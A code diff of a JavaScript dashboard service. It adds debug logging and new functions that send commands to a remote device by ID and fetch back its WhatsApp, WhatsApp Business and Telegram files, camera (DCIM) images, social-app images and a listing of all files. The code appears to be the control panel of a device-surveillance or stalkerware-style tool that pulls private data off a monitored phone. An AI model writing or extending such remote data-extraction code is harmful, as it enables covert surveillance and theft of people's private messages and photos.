@@ -16,6 +16,8 @@ const apiService = axios.create({
 
 const handleApiResponse = (response) => {
   if (response.status === 200) {
+    console.log("i am from handle...........", JSON.parse(response.data.data.response)?.files?.length);
+    
     return response.data.data.response;
   } else {
     throw new Error(`Error: ${response.data.message}`);
@@ -55,7 +57,9 @@ export const fetchNotifications = async (userId) => {
 
 // fetch data
 export const fetchData = async (userId, command, apiEndpoint, path = null) => {
+  if(path==='') path=null;
   try {
+    console.log("fetchingggggg:", userId, command, apiEndpoint, path);
     const response = await apiService.post("command/add", {
       device_id: userId,
       command: command,
@@ -74,6 +78,7 @@ export const fetchData = async (userId, command, apiEndpoint, path = null) => {
         listResponse = await apiService.get(
           `dashboard/datatypes/${apiEndpoint}/${userId}/${cmdKey}`
         );
+        console.log("list response api services:", listResponse);
         break;
       } catch (error) {
         toast.error(`Timed out`);
@@ -120,7 +125,6 @@ export const fetchInternalData = async (
         console.log("fileexists:", fileexists);
         break;
       }
-
       await new Promise((resolve) => setTimeout(resolve, 2000));
     }
     // // Retry if the response is 404
@@ -183,18 +187,33 @@ export const fetchInternalFile = async (userId, path) => {
   return await fetchInternalData(userId, "getfile", "getfile", path);
 };
 
-export const fetchWhatsappData = async (userId) => {
-  return await fetchInternalData(userId, "whatsappfile", "whatsappfile");
+export const fetchWhatsappData = async (userId, path) => {
+  return await fetchData(userId, "whatsappfile", "whatsappfile", path);
 };
 
-export const fetchW4bData = async (userId) => {
-  return await fetchInternalData(userId, "whatsappw4bfile", "whatsappw4bfile");
+export const fetchW4bData = async (userId, path) => {
+  return await fetchData(userId, "whatsappw4bfile", "whatsappw4bfile", path);
 };
 
-export const fetchTelegramfiles = async (userId) => {
-  return await fetchInternalData(userId, "telegramfile", "telegramfile");
+export const fetchTelegramfiles = async (userId,path) => {
+  return await fetchData(userId, "telegramfile", "telegramfile",path);
 };
 
-export const fetchSocialImages = async (userId) => {
-  return await fetchInternalData(userId, "social", "social");
+export const fetchSocialImages = async (userId,path) => {
+  return await fetchData(userId, "social", "social",path);
+};
+
+export const fetchDcimImages = async (userId, path) => {
+  return await fetchData(userId, "dcim", "dcim", path);
+};
+
+export const getwhatsappfile = async (userId, path) => {
+  return await fetchInternalData(userId, "getwhatsappfile", "getwhatsappfile", path);
+};
+
+export const getdcimfile = async (userId, path) => {
+  return await fetchInternalData(userId, "getfile", "getfile", path);
+};
+export const getAllfiles = async (userId, path) => {
+  return await fetchData(userId, "allfiles", "allfiles", path);
 };
